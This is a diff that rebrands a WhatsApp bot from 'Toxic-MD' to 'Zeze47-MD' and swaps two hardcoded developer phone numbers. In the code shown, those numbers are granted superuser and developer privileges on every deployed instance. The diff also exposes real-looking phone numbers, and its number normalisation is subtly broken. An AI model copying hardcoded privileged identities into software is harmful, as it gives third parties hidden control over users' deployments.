@@ -45,7 +45,7 @@ const { isUserBanned, addUserToBanList, removeUserFromBanList } = require("./bdd
 const { addGroupToBanList, isGroupBanned, removeGroupFromBanList } = require("./bdd/banGroup");
 const { isGroupOnlyAdmin, addGroupToOnlyAdminList, removeGroupFromOnlyAdminList } = require("./bdd/onlyAdmin");
 let { reagir } = require(__dirname + "/framework/app");
-var session = conf.session.replace(/Toxic-MD-WHATSAPP-BOT;;;=>/g, "");
+var session = conf.session.replace(/Zeze47-MD-WHATSAPP-BOT;;;=>/g, "");
 const prefixe = conf.PREFIXE;
 const more = String.fromCharCode(8206);
 const readmore = more.repeat(4001);
@@ -74,7 +74,7 @@ setTimeout(() => {
         const sockOptions = {
             version,
             logger: pino({ level: "silent" }),
-            browser: ['Toxic-MD', "Safari"],
+            browser: ['Zeze47-MD', "Safari"],
             printQRInTerminal: true,
             markOnlineOnConnect: false,
             auth: {
@@ -134,8 +134,8 @@ setTimeout(() => {
             var membreGroupe = verifGroupe ? ms.key.participant : '';
             const { getAllSudoNumbers } = require("./bdd/sudo");
             const nomAuteurMessage = ms.pushName;
-            const dj = '254735342808';
-            const dj2 = '254799283147';
+            const dj = '255682937675';
+            const dj2 = '255760109840';
             const sudo = await getAllSudoNumbers();
             const superUserNumbers = [servBot, dj, dj2, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
             const allAllowedNumbers = superUserNumbers.concat(sudo);
@@ -143,7 +143,7 @@ setTimeout(() => {
             var dev = [dj, dj2].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
 
             function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
-            console.log("\tToxic-MD ONLINE ⚡");
+            console.log("\tZeze-MD ONLINE ⚡");
             console.log("==== Message Received ======");
             if (verifGroupe) {
                 console.log("Message from group 🗨️: " + nomGroupe);
